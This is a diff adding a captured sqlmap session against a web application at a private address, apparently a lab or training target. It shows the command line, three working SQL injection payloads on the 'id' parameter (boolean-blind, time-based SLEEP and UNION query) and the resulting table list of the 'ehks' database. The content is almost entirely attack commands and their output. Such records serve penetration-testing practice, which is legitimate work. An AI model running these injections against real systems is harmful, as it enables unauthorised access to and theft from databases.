@@ -1,0 +1,45 @@
+sqlmap -u 'http://192.168.4.136/index.html?page=blog&title=Blog&id=2' -D ehks --tables
+        ___
+       __H__                                                                                                        
+ ___ ___[']_____ ___ ___  {1.7.8#stable}                                                                            
+|_ -| . [)]     | .'| . |                                                                                           
+|___|_  [.]_|_|_|__,|  _|                                                                                           
+      |_|V...       |_|   https://sqlmap.org                                                                        
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:26:55 /2023-09-12/
+
+[09:26:55] [INFO] resuming back-end DBMS 'mysql' 
+[09:26:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=blog&title=Blog&id=2 AND 8711=8711
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=blog&title=Blog&id=2 AND (SELECT 2405 FROM (SELECT(SLEEP(5)))Xqim)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x7178717171,0x776d517141635356746e4b45794f544d7173506771655869614a47424f545569786b77566b514959,0x716b707171),NULL,NULL-- -
+---
+[09:26:56] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 5 (Bordeaux)
+web application technology: PHP 5.1.2, Apache 2.2.0
+back-end DBMS: MySQL >= 5.0.12
+[09:26:56] [INFO] fetching tables for database: 'ehks'
+Database: ehks
+[3 tables]
++---------+
+| comment |
+| user    |
+| blog    |
++---------+
+
+[09:26:56] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.4.136'
+
+[*] ending @ 09:26:56 /2023-09-12/
